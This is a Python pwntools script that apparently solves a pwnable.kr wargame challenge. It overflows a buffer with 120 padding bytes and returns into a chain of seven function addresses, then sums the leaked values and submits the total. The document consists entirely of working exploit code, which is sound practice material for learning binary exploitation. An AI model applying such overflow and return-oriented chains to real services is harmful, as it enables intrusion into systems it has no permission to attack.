from pwn import *
import re
host = r"pwnable.kr"
port = 9032

A = p32(0x0809fe4b)
B = p32(0x0809fe6a)
C = p32(0x0809fe89)
D = p32(0x0809fea8)
E = p32(0x0809fec7)
F = p32(0x0809fee6)
G = p32(0x0809ff05)
callrop = p32(0x0809fffc)
offset = 120
r = remote(host,port)
print(r.recvuntil(" Menu:").decode())
r.sendline("42")
print("42")
print(r.recvuntil("earned? : ").decode())
payload = (b"\x41" * offset) + A+B+C+D+E+F+G+callrop
r.sendline(payload)
print(r.recv().decode())
hore = r.recvuntil("Menu:").decode()
print(f"\n\n{hore}")
exp = 0
hore = hore.split("\n")
hore.pop(0)
hore.pop(-1)
print(hore)
for i in hore:
    m = int(re.search("\(EXP \+([^)]+)\)",i).group(1))  & 0xffffffff
    exp += m
exp = exp & 0xffffffff
r.sendline("3")
print(r.recvuntil("earned? : ").decode())
exp = str(exp)
r.sendline(exp)
print(r.recvline().decode())
